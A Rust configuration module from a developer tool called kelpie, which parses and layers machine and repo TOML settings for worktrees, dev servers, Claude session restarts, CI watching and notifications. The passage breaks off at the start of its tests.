use std::path::{Component, Path, PathBuf};

use toml::{Table, Value};

use crate::repo::{main_checkout, name_of, slot_number, worktree_port};
use crate::sh::Result;

#[derive(Clone, Copy, Debug, PartialEq)]
pub enum Source {
    Local,
    Vault,
    Linear,
}

impl Source {
    pub const ALL: [Source; 3] = [Source::Local, Source::Vault, Source::Linear];

    pub fn key(self) -> &'static str {
        match self {
            Source::Local => "local",
            Source::Vault => "vault",
            Source::Linear => "linear",
        }
    }

    pub fn title(self) -> &'static str {
        match self {
            Source::Local => "local",
            Source::Vault => "vault",
            Source::Linear => "Linear",
        }
    }
}

#[derive(Clone, Copy, Debug, Default, PartialEq)]
pub enum Channel {
    Main,
    #[default]
    Release,
}

impl Channel {
    pub fn key(self) -> &'static str {
        match self {
            Channel::Main => "main",
            Channel::Release => "release",
        }
    }
}

#[derive(Clone, Copy, Debug, Default, PartialEq)]
pub enum AlsoNoticed {
    #[default]
    Backlog,
    Fix,
    Ask,
}

impl AlsoNoticed {
    pub const ALL: [AlsoNoticed; 3] = [AlsoNoticed::Backlog, AlsoNoticed::Fix, AlsoNoticed::Ask];

    pub fn key(self) -> &'static str {
        match self {
            AlsoNoticed::Backlog => "backlog",
            AlsoNoticed::Fix => "fix",
            AlsoNoticed::Ask => "ask",
        }
    }
}

pub const DEFAULT_SETUP_SKILL: &str = "kelpie:set-up-worktree";
pub const DEFAULT_RULES_SKILL: &str = "kelpie:work-rules";
pub const DEFAULT_DEV_URL: &str = "http://localhost:{port}";
pub const DEFAULT_SERVER_NAME: &str = "server";
pub const DEFAULT_WORKER_NAME: &str = "worker";
const PLACEHOLDERS: [&str; 4] = ["worktree", "repo", "number", "port"];

#[derive(Clone, Debug, Default, PartialEq)]
pub struct Worktree {
    pub setup_skill: Option<String>,
    pub setup_command: Option<String>,
    pub dev_server: Option<String>,
    pub dev_worker: Option<String>,
    pub dev_url: Option<String>,
    pub rules_skill: Option<String>,
    pub test_commands: Option<Vec<String>>,
    pub also_noticed: Option<AlsoNoticed>,
    pub review_model: Option<String>,
    pub notify_command: Option<String>,
    pub vault_command: Option<String>,
    pub server_name: Option<String>,
    pub worker_name: Option<String>,
    pub ci_watch: Option<bool>,
}

#[derive(Clone, Debug, Default, PartialEq)]
pub struct Machine {
    pub keys: Vec<(String, String)>,
    pub sources: Option<Vec<Source>>,
    pub channel: Option<Channel>,
    pub restart: Restart,
    pub keeper: Option<bool>,
    pub recover: Option<bool>,
    pub worktree: Worktree,
}

#[derive(Clone, Copy, Debug, Default, PartialEq)]
pub struct Restart {
    pub idle_minutes: Option<u64>,
    pub auto: Option<bool>,
}

pub const DEFAULT_IDLE_MINUTES: u64 = 10;

#[derive(Clone, Copy, Debug, PartialEq)]
pub enum Layer {
    Repo,
    Machine,
    Default,
}

impl Layer {
    pub fn label(self) -> &'static str {
        match self {
            Layer::Repo => "repo config",
            Layer::Machine => "machine config",
            Layer::Default => "default",
        }
    }
}

#[derive(Clone, Debug, PartialEq)]
pub struct Setting<T> {
    pub value: T,
    pub layer: Layer,
}

#[derive(Clone, Debug, PartialEq)]
pub struct Settings {
    pub sources: Setting<Vec<Source>>,
    pub setup_skill: Setting<String>,
    pub setup_command: Setting<Option<String>>,
    pub dev_server: Setting<Option<String>>,
    pub dev_worker: Setting<Option<String>>,
    pub dev_url: Setting<Option<String>>,
    pub rules_skill: Setting<String>,
    pub test_commands: Setting<Vec<String>>,
    pub also_noticed: Setting<AlsoNoticed>,
    pub review_model: Setting<Option<String>>,
    pub notify_command: Setting<Option<String>>,
    pub vault_command: Setting<Option<String>>,
    pub server_name: Setting<String>,
    pub worker_name: Setting<String>,
    pub channel: Setting<Channel>,
    pub idle_minutes: Setting<u64>,
    pub auto_restart: Setting<bool>,
    pub ci_watch: Setting<bool>,
    pub keeper: Setting<bool>,
    pub recover: Setting<bool>,
}

pub struct Loaded {
    pub machine: PathBuf,
    pub repo: Option<PathBuf>,
    pub settings: Settings,
}

pub fn dir() -> PathBuf {
    std::env::var("XDG_CONFIG_HOME").map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from(std::env::var("HOME").unwrap_or_default()).join(".config"))
        .join("kelpie")
}

pub fn path() -> PathBuf {
    std::env::var("KELPIE_CONFIG").map(PathBuf::from).unwrap_or_else(|_| dir().join("config.toml"))
}

pub fn repos_dir() -> PathBuf {
    std::env::var("KELPIE_REPOS_DIR").map(PathBuf::from).unwrap_or_else(|_| dir().join("repos"))
}

// A worktree shares its main checkout's file, since the file is named after the main checkout's folder.
pub fn repo_file_in(dir: &Path, repo: &Path) -> PathBuf {
    let main = main_checkout(repo).unwrap_or_else(|_| repo.to_path_buf());
    dir.join(format!("{}.toml", name_of(&main)))
}

pub fn repo_file(repo: &Path) -> PathBuf {
    repo_file_in(&repos_dir(), repo)
}

pub fn shown(path: &Path) -> String {
    let found = if path.exists() { "found" } else { "not found" };
    match std::fs::read_link(path) {
        Ok(target) => format!("{} -> {} ({found})", path.display(), path.parent().map_or(target.clone(), |parent| parent.join(&target)).display()),
        Err(_) => format!("{} ({found})", path.display()),
    }
}

fn read(path: &Path) -> Result<Option<String>> {
    match std::fs::read_to_string(path) {
        Ok(text) => Ok(Some(text)),
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(None),
        Err(error) => Err(format!("{}: {error}", path.display())),
    }
}

pub fn load_machine(path: &Path) -> Result<Machine> {
    read(path)?.map_or(Ok(Machine::default()), |text| parse_machine(&text, &path.display().to_string()))
}

pub fn load_repo(path: &Path) -> Result<Worktree> {
    read(path)?.map_or(Ok(Worktree::default()), |text| parse_repo(&text, &path.display().to_string()))
}

pub fn unknown_keys(table: &Table, prefix: &str, known: &[&str]) -> Result<()> {
    match table.keys().find(|key| !known.contains(&key.as_str())) {
        Some(key) => Err(format!("{prefix}{key}: unknown key; known keys here: {}", known.join(", "))),
        None => Ok(()),
    }
}

fn subtable<'a>(table: &'a Table, key: &str, name: &str) -> Result<Option<&'a Table>> {
    table.get(key).map(|value| value.as_table().ok_or(format!("{name}: must be a table"))).transpose()
}

fn strings(value: &Value, key: &str) -> Result<Vec<String>> {
    let items = value.as_array().ok_or(format!("{key}: must be a list of strings"))?;
    items.iter().map(|item| item.as_str().map(str::to_string).ok_or(format!("{key}: must be a list of strings"))).collect()
}

// A path a repo config names stays inside the repo: relative, with no .. in it.
pub fn inside(path: &str) -> bool {
    let path = Path::new(path);
    !path.as_os_str().is_empty() && path.components().all(|part| matches!(part, Component::Normal(_) | Component::CurDir))
}

// A skill is a folder name, after its plugin's name and a colon or alone, so it never walks out of a skills folder.
pub fn skill_name(name: &str) -> bool {
    let (plugin, skill) = name.split_once(':').unwrap_or(("own", name));
    [plugin, skill].iter().all(|part| !part.is_empty() && *part != "." && *part != ".." && !part.contains(['/', '\\', ':']))
}

fn skill(table: &Table, field: &str, key: &str) -> Result<Option<String>> {
    let name = text(table, field, key)?;
    match name {
        Some(name) if !skill_name(&name) => Err(format!("{key}: \"{name}\" is not a skill name; use <skill> or <plugin>:<skill>, without / or ..")),
        name => Ok(name),
    }
}

fn text(table: &Table, field: &str, key: &str) -> Result<Option<String>> {
    let Some(value) = table.get(field) else { return Ok(None) };
    match value.as_str().map(str::trim) {
        Some("") => Err(format!("{key}: must not be empty")),
        Some(text) => Ok(Some(text.to_string())),
        None => Err(format!("{key}: must be a string")),
    }
}

enum Piece<'a> {
    Text(&'a str),
    Field(&'a str),
}

fn pieces(template: &str) -> Result<Vec<Piece<'_>>> {
    let mut pieces = Vec::new();
    let mut rest = template;
    while let Some(open) = rest.find('{') {
        pieces.push(Piece::Text(&rest[..open]));
        let close = rest[open..].find('}').ok_or(format!("{template:?} opens a {{ it never closes"))? + open;
        let name = &rest[open + 1..close];
        if !PLACEHOLDERS.contains(&name) {
            return Err(format!("{{{name}}} is not a placeholder; use {{worktree}}, {{repo}}, {{number}} or {{port}}"));
        }
        pieces.push(Piece::Field(name));
        rest = &rest[close + 1..];
    }
    pieces.push(Piece::Text(rest));
    Ok(pieces)
}

// An empty template is kept, since it is how dev_url turns the link off.
fn template(table: &Table, field: &str, key: &str) -> Result<Option<String>> {
    let Some(value) = table.get(field) else { return Ok(None) };
    let text = value.as_str().ok_or(format!("{key}: must be a string"))?.trim();
    pieces(text).map_err(|error| format!("{key}: {error}"))?;
    Ok(Some(text.to_string()))
}

pub struct Place {
    pub worktree: String,
    pub repo: String,
    pub number: Option<usize>,
    pub port: Option<u16>,
}

pub fn expand(template: &str, place: &Place) -> Option<String> {
    let parts: Option<Vec<String>> = pieces(template).ok()?.into_iter().map(|piece| match piece {
        Piece::Text(text) => Some(text.to_string()),
        Piece::Field("worktree") => Some(place.worktree.clone()),
        Piece::Field("repo") => Some(place.repo.clone()),
        Piece::Field("number") => place.number.map(|number| number.to_string()),
        Piece::Field(_) => place.port.map(|port| port.to_string()),
    }).collect();
    Some(parts?.concat()).filter(|url| !url.is_empty())
}

pub fn dev_url(template: Option<&str>, repo: &Path, worktree: &Path) -> Option<String> {
    let template = template?;
    let port = if template.contains("{port}") { worktree_port(worktree) } else { None };
    expand(template, &Place { worktree: name_of(worktree), repo: name_of(repo), number: slot_number(repo, worktree), port })
}

fn backlog_sources(backlog: &Table) -> Result<Option<Vec<Source>>> {
    let Some(value) = backlog.get("sources") else { return Ok(None) };
    let mut found = Vec::new();
    for name in strings(value, "board.backlog.sources")? {
        let source = Source::ALL.into_iter().find(|source| source.key() == name)
            .ok_or(format!("board.backlog.sources: \"{name}\" is not a source; use \"local\", \"vault\" or \"linear\""))?;
        if found.contains(&source) {
            return Err(format!("board.backlog.sources: \"{name}\" is listed twice"));
        }
        found.push(source);
    }
    Ok(Some(found))
}

fn board(table: &Table) -> Result<Option<Vec<Source>>> {
    let Some(board) = subtable(table, "board", "board")? else { return Ok(None) };
    unknown_keys(board, "board.", &["backlog"])?;
    let Some(backlog) = subtable(board, "backlog", "board.backlog")? else { return Ok(None) };
    unknown_keys(backlog, "board.backlog.", &["sources"])?;
    backlog_sources(backlog)
}

fn update(table: &Table) -> Result<Option<Channel>> {
    let Some(update) = subtable(table, "update", "update")? else { return Ok(None) };
    unknown_keys(update, "update.", &["channel"])?;
    match text(update, "channel", "update.channel")?.as_deref() {
        None => Ok(None),
        Some("main") => Ok(Some(Channel::Main)),
        Some("release") => Ok(Some(Channel::Release)),
        Some(other) => Err(format!("update.channel: \"{other}\" is not a channel; use \"main\" or \"release\"")),
    }
}

// The board's keys are checked against each other in keys.rs, where a bad entry is left out rather than failing the file.
fn keys(table: &Table) -> Result<Vec<(String, String)>> {
    let Some(keys) = subtable(table, "keys", "keys")? else { return Ok(Vec::new()) };
    Ok(keys.iter().map(|(name, value)| (name.clone(), value.as_str().map_or_else(|| format!("{} {}", value.type_str(), "value"), str::to_string))).collect())
}

fn restart(table: &Table) -> Result<Restart> {
    let Some(restart) = subtable(table, "restart", "restart")? else { return Ok(Restart::default()) };
    unknown_keys(restart, "restart.", &["idle_minutes", "auto"])?;
    let idle_minutes = match restart.get("idle_minutes") {
        None => None,
        Some(value) => Some(value.as_integer().filter(|minutes| (1..=1440).contains(minutes)).ok_or("restart.idle_minutes: must be a whole number of minutes, 1 to 1440")? as u64),
    };
    let auto = restart.get("auto").map(|value| value.as_bool().ok_or("restart.auto: must be true or false")).transpose()?;
    Ok(Restart { idle_minutes, auto })
}

fn enabled_in(table: &Table, name: &str) -> Result<Option<bool>> {
    let Some(section) = subtable(table, name, name)? else { return Ok(None) };
    unknown_keys(section, &format!("{name}."), &["enabled"])?;
    section.get("enabled").map(|value| value.as_bool().ok_or_else(|| format!("{name}.enabled: must be true or false"))).transpose()
}

fn worktree(table: &Table) -> Result<Worktree> {
    let Some(worktree) = subtable(table, "worktree", "worktree")? else { return Ok(Worktree::default()) };
    unknown_keys(worktree, "worktree.", &["setup_skill", "setup_command", "dev_server", "dev_worker", "dev_url", "server_name", "worker_name"])?;
    Ok(Worktree {
        setup_skill: skill(worktree, "setup_skill", "worktree.setup_skill")?,
        setup_command: text(worktree, "setup_command", "worktree.setup_command")?,
        dev_server: text(worktree, "dev_server", "worktree.dev_server")?,
        dev_worker: text(worktree, "dev_worker", "worktree.dev_worker")?,
        dev_url: template(worktree, "dev_url", "worktree.dev_url")?,
        rules_skill: None,
        test_commands: None,
        also_noticed: None,
        review_model: None,
        notify_command: None,
        vault_command: None,
        server_name: text(worktree, "server_name", "worktree.server_name")?,
        worker_name: text(worktree, "worker_name", "worktree.worker_name")?,
        ci_watch: None,
    })
}

fn with_task(table: &Table, mut worktree: Worktree) -> Result<Worktree> {
    if let Some(task) = subtable(table, "task", "task")? {
        unknown_keys(task, "task.", &["rules_skill", "test_commands", "also_noticed"])?;
        worktree.rules_skill = skill(task, "rules_skill", "task.rules_skill")?;
        worktree.test_commands = task.get("test_commands").map(test_commands).transpose()?;
        worktree.also_noticed = also_noticed(task)?;
    }
    Ok(worktree)
}

fn also_noticed(task: &Table) -> Result<Option<AlsoNoticed>> {
    let Some(name) = text(task, "also_noticed", "task.also_noticed")? else { return Ok(None) };
    AlsoNoticed::ALL.into_iter().find(|choice| choice.key() == name).map(Some)
        .ok_or(format!("task.also_noticed: \"{name}\" is not a choice; use \"backlog\", \"fix\" or \"ask\""))
}

fn test_commands(value: &Value) -> Result<Vec<String>> {
    let commands = strings(value, "task.test_commands")?;
    match commands.iter().find(|command| command.trim().is_empty()) {
        Some(_) => Err("task.test_commands: a command must not be empty".to_string()),
        None => Ok(commands.iter().map(|command| command.trim().to_string()).collect()),
    }
}

fn with_review(table: &Table, mut worktree: Worktree) -> Result<Worktree> {
    if let Some(review) = subtable(table, "review", "review")? {
        unknown_keys(review, "review.", &["model"])?;
        worktree.review_model = text(review, "model", "review.model")?;
    }
    Ok(worktree)
}

fn with_notify(table: &Table, mut worktree: Worktree) -> Result<Worktree> {
    if let Some(notify) = subtable(table, "notify", "notify")? {
        unknown_keys(notify, "notify.", &["command"])?;
        worktree.notify_command = text(notify, "command", "notify.command")?;
    }
    Ok(worktree)
}

fn with_vault(table: &Table, mut worktree: Worktree) -> Result<Worktree> {
    if let Some(vault) = subtable(table, "vault", "vault")? {
        unknown_keys(vault, "vault.", &["command"])?;
        worktree.vault_command = text(vault, "command", "vault.command")?;
    }
    Ok(worktree)
}

fn with_ci(table: &Table, mut worktree: Worktree) -> Result<Worktree> {
    if let Some(ci) = subtable(table, "ci", "ci")? {
        unknown_keys(ci, "ci.", &["watch"])?;
        worktree.ci_watch = ci.get("watch").map(|value| value.as_bool().ok_or("ci.watch: must be true or false")).transpose()?;
    }
    Ok(worktree)
}

fn layers(table: &Table) -> Result<Worktree> {
    worktree(table).and_then(|worktree| with_task(table, worktree)).and_then(|worktree| with_review(table, worktree)).and_then(|worktree| with_notify(table, worktree)).and_then(|worktree| with_vault(table, worktree)).and_then(|worktree| with_ci(table, worktree))
}

fn table(text: &str, source: &str) -> Result<Table> {
    text.parse().map_err(|error: toml::de::Error| format!("{source}: {}", error.to_string().trim()))
}

pub fn parse_machine(text: &str, source: &str) -> Result<Machine> {
    let table = table(text, source)?;
    let fail = |error: String| format!("{source}: {error}");
    unknown_keys(&table, "", &["board", "worktree", "task", "review", "notify", "vault", "update", "restart", "keeper", "recover", "keys", "ci", "routines"]).map_err(fail)?;
    let worktree = layers(&table).map_err(fail)?;
    crate::routines::parse_list(&table, None, source).map_err(fail)?;
    Ok(Machine { keys: keys(&table).map_err(fail)?, sources: board(&table).map_err(fail)?, channel: update(&table).map_err(fail)?, restart: restart(&table).map_err(fail)?, keeper: enabled_in(&table, "keeper").map_err(fail)?, recover: enabled_in(&table, "recover").map_err(fail)?, worktree })
}

const MACHINE_WIDE: &str = "applies to every repo, so it lives in config.toml";

// The [[actions]] are actions.rs's to check.
pub fn parse_repo(text: &str, source: &str) -> Result<Worktree> {
    let table = table(text, source)?;
    let fail = |error: String| format!("{source}: {error}");
    for (key, setting) in [("board", "[board.backlog] sources"), ("notify", "[notify] command"), ("update", "[update] channel"), ("vault", "[vault] command"), ("restart", "[restart] idle_minutes and auto"), ("keeper", "[keeper] enabled"), ("recover", "[recover] enabled"), ("keys", "[keys]")] {
        if table.contains_key(key) {
            return Err(fail(format!("{key}: {MACHINE_WIDE}; set {setting} in {}", path().display())));
        }
    }
    unknown_keys(&table, "", &["actions", "worktree", "task", "review", "ci", "routines"]).map_err(fail)?;
    let worktree = layers(&table).map_err(fail)?;
    let repo = Path::new(source).file_stem().map(|stem| stem.to_string_lossy().to_string());
    crate::routines::parse_list(&table, repo.as_deref(), source).map_err(fail)?;
    if worktree.server_name.is_some() || worktree.worker_name.is_some() {
        return Err(fail(format!("worktree.server_name and worker_name: {MACHINE_WIDE}, since the sidebar names every Space's server and worker alike; set them in {}", path().display())));
    }
    Ok(worktree)
}

fn pick<T: Clone>(repo: Option<&T>, machine: Option<&T>) -> Option<Setting<T>> {
    match (repo, machine) {
        (Some(value), _) => Some(Setting { value: value.clone(), layer: Layer::Repo }),
        (None, Some(value)) => Some(Setting { value: value.clone(), layer: Layer::Machine }),
        (None, None) => None,
    }
}

fn or_default<T>(setting: Option<Setting<T>>, value: T) -> Setting<T> {
    setting.unwrap_or(Setting { value, layer: Layer::Default })
}

pub fn settings(repo: &Worktree, machine: &Machine) -> Settings {
    let optional = |setting: Option<Setting<String>>| or_default(setting.map(|setting| Setting { value: Some(setting.value), layer: setting.layer }), None);
    Settings {
        sources: or_default(pick(None, machine.sources.as_ref()), vec![Source::Local]),
        setup_skill: or_default(pick(repo.setup_skill.as_ref(), machine.worktree.setup_skill.as_ref()), DEFAULT_SETUP_SKILL.to_string()),
        setup_command: optional(pick(repo.setup_command.as_ref(), machine.worktree.setup_command.as_ref())),
        dev_server: optional(pick(repo.dev_server.as_ref(), machine.worktree.dev_server.as_ref())),
        dev_worker: optional(pick(repo.dev_worker.as_ref(), machine.worktree.dev_worker.as_ref())),
        dev_url: or_default(pick(repo.dev_url.as_ref(), machine.worktree.dev_url.as_ref())
            .map(|setting| Setting { value: Some(setting.value).filter(|url| !url.is_empty()), layer: setting.layer }), Some(DEFAULT_DEV_URL.to_string())),
        rules_skill: or_default(pick(repo.rules_skill.as_ref(), machine.worktree.rules_skill.as_ref()), DEFAULT_RULES_SKILL.to_string()),
        test_commands: or_default(pick(repo.test_commands.as_ref(), machine.worktree.test_commands.as_ref()), Vec::new()),
        also_noticed: or_default(pick(repo.also_noticed.as_ref(), machine.worktree.also_noticed.as_ref()), AlsoNoticed::default()),
        review_model: optional(pick(repo.review_model.as_ref(), machine.worktree.review_model.as_ref())),
        notify_command: optional(pick(None, machine.worktree.notify_command.as_ref())),
        vault_command: optional(pick(None, machine.worktree.vault_command.as_ref())),
        server_name: or_default(pick(None, machine.worktree.server_name.as_ref()), DEFAULT_SERVER_NAME.to_string()),
        worker_name: or_default(pick(None, machine.worktree.worker_name.as_ref()), DEFAULT_WORKER_NAME.to_string()),
        channel: or_default(pick(None, machine.channel.as_ref()), Channel::default()),
        idle_minutes: or_default(pick(None, machine.restart.idle_minutes.as_ref()), DEFAULT_IDLE_MINUTES),
        auto_restart: or_default(pick(None, machine.restart.auto.as_ref()), true),
        ci_watch: or_default(pick(repo.ci_watch.as_ref(), machine.worktree.ci_watch.as_ref()), true),
        keeper: or_default(pick(None, machine.keeper.as_ref()), true),
        recover: or_default(pick(None, machine.recover.as_ref()), true),
    }
}

// A command naming a path applies only in a repo that has that file, so one machine-wide value leaves other repos on the default setup.
pub fn setup_command_in(command: Option<String>, repo: &Path) -> Option<String> {
    command.filter(|command| {
        let program = command.split_whitespace().next().unwrap_or(command);
        !program.contains('/') || repo.join(program).exists()
    })
}

pub fn resolve(repo: Option<&Path>) -> Result<Loaded> {
    let machine = path();
    let repo = repo.map(repo_file);
    let own = repo.as_deref().map(load_repo).transpose()?.unwrap_or_default();
    Ok(Loaded { settings: settings(&own, &load_machine(&machine)?), machine, repo })
}

pub fn sources() -> Result<Vec<Source>> {
    Ok(resolve(None)?.settings.sources.value)
}

pub fn restart_settings() -> Result<(bool, u64)> {
    let settings = resolve(None)?.settings;
    Ok((settings.auto_restart.value, settings.idle_minutes.value))
}

pub fn keeper_enabled() -> Result<bool> {
    Ok(load_machine(&path())?.keeper.unwrap_or(true))
}

pub fn recover_enabled() -> Result<bool> {
    Ok(load_machine(&path())?.recover.unwrap_or(true))
}

pub fn channel() -> Result<Channel> {
    Ok(load_machine(&path())?.channel.unwrap_or_default())
}

fn quoted(items: &[&str]) -> String {
    format!("[{}]", items.iter().map(|item| format!("{item:?}")).collect::<Vec<_>>().join(", "))
}

pub fn describe(loaded: &Loaded) -> String {
    let Settings { sources, setup_skill, setup_command, dev_server, dev_worker, dev_url, rules_skill, test_commands, also_noticed, review_model, notify_command, vault_command, server_name, worker_name, channel, idle_minutes, auto_restart, ci_watch, keeper, recover } = &loaded.settings;
    let repo = match &loaded.repo {
        Some(path) => shown(path),
        None => "none: not in a git repo (--repo <path> names one)".to_string(),
    };
    let mut lines: Vec<String> = [
        ("repo config", repo),
        ("machine config", shown(&loaded.machine)),
        ("defaults", "built in".to_string()),
    ].into_iter().map(|(layer, file)| format!("{:<16}{file}", format!("{layer}:"))).collect();
    lines.push(String::new());
    lines.push(format!("Each key below may be set in config.toml or, for one repo, in {}/<repo>.toml (named after the main checkout's folder), which wins; a key marked config.toml only applies to every repo.", repos_dir().display()));
    lines.push(String::new());
    let names: Vec<&str> = sources.value.iter().map(|source| source.key()).collect();
    let entries = load_machine(&loaded.machine).map(|machine| machine.keys).unwrap_or_default();
    let (board_keys, key_errors) = crate::keys::Keys::with(&entries);
    let (server_key, worker_key) = (board_keys.char(crate::keys::Act::Server), board_keys.char(crate::keys::Act::Worker));
    let mut key = |name: &str, value: String, layer: Layer, about: &str| {
        lines.push(format!("{name} = {value}  ({})", layer.label()));
        lines.push(format!("  {about}"));
    };
    key("board.backlog.sources", quoted(&names), sources.layer,
        "Where the board's Backlog tab finds work: \"local\" (backlog.md next to the machine config), \"vault\" and \"linear\", in any combination; config.toml only.");
    key("worktree.setup_skill", format!("{:?}", setup_skill.value), setup_skill.layer,
        "The skill a task's Claude runs first to make its worktree runnable.");
    key("worktree.setup_command", setup_command.value.as_ref().map_or("none".to_string(), |command| format!("{command:?}")), setup_command.layer,
        "The repo's own command that prepares an existing worktree, run from inside it; the setup skill runs it. A path applies only in a repo that has the file; elsewhere, and when none, bin/setup-worktree when the repo has one.");
    key("worktree.dev_server", dev_server.value.as_ref().map_or("none".to_string(), |command| format!("{command:?}")), dev_server.layer,
        &format!("The shell command the board's {server_key} key runs in a server tab of the task's Space, with PORT set to the worktree's port; without one there is no {server_key}."));
    key("worktree.dev_worker", dev_worker.value.as_ref().map_or("none".to_string(), |command| format!("{command:?}")), dev_worker.layer,
        &format!("A second command, such as a job runner, the board's {worker_key} key runs in a worker tab of the task's Space, with the same PORT; without one there is no {worker_key}."));
    key("worktree.dev_url", dev_url.value.as_ref().map_or("\"\" (no link)".to_string(), |url| format!("{url:?}")), dev_url.layer,
        "The running dev server's address, shown on the board as a link: {worktree} (the worktree's folder), {repo}, {number} (its pool number) and {port} (its port) are filled in; a worktree without what it names gets no link, and \"\" turns the link off.");
    key("worktree.server_name", format!("{:?}", server_name.value), server_name.layer,
        &format!("The name of the tab the board's {server_key} starts the dev server in, and of the Space's tag in herdr's sidebar while it runs; config.toml only."));
    key("worktree.worker_name", format!("{:?}", worker_name.value), worker_name.layer,
        &format!("The same for the worker tab {worker_key} starts; config.toml only."));
    key("task.rules_skill", format!("{:?}", rules_skill.value), rules_skill.layer,
        "The skill with the rules for how work is planned, built and committed; a task's Claude follows it, the lead checks a finished task against it, tidy reshapes commits by it.");
    let own: Vec<&str> = test_commands.value.iter().map(String::as_str).collect();
    key("task.test_commands", quoted(&own), test_commands.layer,
        &format!("Test commands of this repo that kelpie records when a task's Claude runs them, on top of the built-in {}; matched on the command's start, after any cd … && and VAR=value. kelpie evidence, the board, the push dialog and the reviewer show the runs.", quoted(&crate::evidence::DEFAULT_COMMANDS)));
    key("task.also_noticed", format!("{:?}", also_noticed.value.key()), also_noticed.layer,
        "What a task's Claude does with what it notices outside its task (a bug nearby, a stale doc, a refactor): \"backlog\" files it, in the vault's backlog with the vault plugin, else with kelpie backlog add; \"fix\" fixes a small related one in a commit of its own and files the rest; \"ask\" puts each to you with kelpie ask first. Each is listed under Also noticed on the sign-off card, and the reviewer counts an unrelated change under \"backlog\" or \"ask\" as a finding.");
    key("review.model", review_model.value.as_ref().map_or("none".to_string(), |model| format!("{model:?}")), review_model.layer,
        "The model kelpie review's independent reviewer runs on; none leaves it to Claude's default.");
    key("notify.command", notify_command.value.as_ref().map_or("none".to_string(), |command| format!("{command:?}")), notify_command.layer,
        "The shell command kelpie runs when something needs you (a task needs you or is ready, a question waits, the lead's summary); KELPIE_EVENT, KELPIE_TASK, KELPIE_REPO and KELPIE_TEXT describe it, and $1 is the text. None sends no notifications; config.toml only.");
    key("vault.command", vault_command.value.as_ref().map_or("none".to_string(), |command| format!("{command:?}")), vault_command.layer,
        "The notes-vault-mcp command kelpie writes task notes and log lines with, before its own arguments (task open, log append, ...); none runs the vault plugin's own pinned command from its hooks. Used only while the vault plugin is installed and enabled; config.toml only.");
    key("ci.watch", ci_watch.value.to_string(), ci_watch.layer,
        "Whether kelpie watches GitHub Actions after a push and keeps the task open under CI running until every run for the pushed commit is green; a failed run moves the task to Needs you and its Claude gets the failing job's log. Needs origin on GitHub and gh logged in; false closes the task right after the push. A repo config can turn it off for one repo.");
    key("update.channel", format!("{:?}", channel.value.key()), channel.layer,
        "What kelpie update installs on this machine: \"release\", the highest vX.Y.Z tag on origin; \"main\", origin's default branch as it is pushed. kelpie update --from <branch or path> runs other code until kelpie update --stable; config.toml only.");
    key("restart.auto", auto_restart.value.to_string(), auto_restart.layer,
        "Whether kelpie restarts Claude sessions that run an older Claude Code, plugin, MCP config or kelpie than is installed, each with claude --resume in its own pane, keeping its flags; kelpie update restarts the idle ones at once. false restarts nothing on its own: the board still marks stale sessions, and kelpie restart restarts them when you want; config.toml only.");
    key("restart.idle_minutes", idle_minutes.value.to_string(), idle_minutes.layer,
        "How long a stale session waits idle and unfocused before it is restarted; a session mid-turn, the pane you are in and one with background work running are never restarted on their own; config.toml only.");
    key("keeper.enabled", keeper.value.to_string(), keeper.layer,
        "Whether one background kelpie keeper per machine runs the routines (stale-session restarts, the update check, held messages, delivery checks of typed prompts, scheduled [[routines]]), so they go on with the board closed; herdr's startup, the board and kelpie update start it. false runs them in an open board instead; config.toml only.");
    key("recover.enabled", recover.value.to_string(), recover.layer,
        "Whether kelpie resumes a task whose Claude an API error stopped: after overload, a server error, a rate limit or a dropped connection it says carry on after 1, 2, 4 and 8 minutes; after a usage limit, once the allowance resets. A login, billing, invalid request or refusal error goes to you under Needs you at once. false leaves every such task idle; config.toml only.");
    lines.push("[keys]  (config.toml only)\n  The board's keys, as name = \"key\" by action: a plain character for an action whose key is one (esc, ctrl+c, ⏎, the arrows and tab stay), and one not taken by another action where both act; moving two at once in the table works. An entry that breaks a rule is ignored, and named below. Help, hints and messages show the key in effect.".to_string());
    lines.extend(board_keys.describe(&key_errors).into_iter().map(|line| format!("  {line}")));
    lines.push(format!("[[routines]]  (config.toml or a repo config)\n  Checks kelpie runs on a schedule, each as a task that reports, plans or fixes, one table each with the keys {}; a repo config's run in its repo, one in config.toml names its repo. Listed below are config.toml's and this repo's; kelpie routines lists every one with its next run, and docs/reference/configuration.md shows each key.", crate::routines::KEYS.join(", ")));
    let repo_file = loaded.repo.clone().map(|file| { let stem = file.file_stem().map(|stem| stem.to_string_lossy().to_string()); (file, stem) });
    let (routines, errors) = crate::routines::load_files([(loaded.machine.clone(), None)].into_iter().chain(repo_file).collect());
    lines.extend(routines.iter().map(|routine| format!("  {}: {} in {}, {}{}", routine.id, routine.schedule.text(), routine.repo, routine.mode.key(), if routine.enabled { "" } else { ", off" })));
    lines.extend(errors.iter().map(|error| format!("  ignored: {error}")));
    lines.push(format!("[[actions]]  (repo config only)\n  The Areas page's own actions for the repo, one table each, with the keys {}; docs/reference/configuration.md shows each.", crate::actions::ACTION_KEYS.join(", ")));
    lines.join("\n")
}

// For scripts such as the sidebar sync: one machine-wide setting's value, plain.
pub fn get(key: &str) -> Result<String> {
    let settings = resolve(None)?.settings;
    match key {
        "worktree.server_name" => Ok(settings.server_name.value),
        "worktree.worker_name" => Ok(settings.worker_name.value),
        other => Err(format!("kelpie config --get knows worktree.server_name and worktree.worker_name, not {other}")),
    }
}

pub fn show(cwd: &Path, repo: Option<&str>) -> Result<String> {
    let repo = match repo {
        Some(path) => {
            let path = PathBuf::from(path);
            main_checkout(&path).map_err(|_| format!("--repo {}: not a git repository", path.display()))?;
            Some(path)
        }
        None => main_checkout(cwd).ok().map(|_| cwd.to_path_buf()),
    };
    Ok(describe(&resolve(repo.as_deref())?))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn keys_live_in_config_toml_only_and_kelpie_config_shows_each_with_why_an_entry_was_ignored() {
        let config = machine("[keys]\ninbox = \"I\"\nchat = \"p\"\nback = \"x\"\nnew = 3\n");
        assert_eq!(config.keys, [("back".to_string(), "x".to_string()), ("chat".to_string(), "p".to_string()), ("inbox".to_string(), "I".to_string()), ("new".to_string(), "integer value".to_string())]);
        let refused = parse_repo("[keys]\ninbox = \"I\"\n", "app.toml").unwrap_err();
        assert!(refused.contains("keys: applies to every repo, so it lives in config.toml; set [keys] in"), "{refused}");
        let dir = crate::sh::test_dir("config-keys");
        let file = dir.join("config.toml");
        std::fs::write(&file, "[keys]\ninbox = \"I\"\nchat = \"p\"\nserver = \"W\"\n").unwrap();
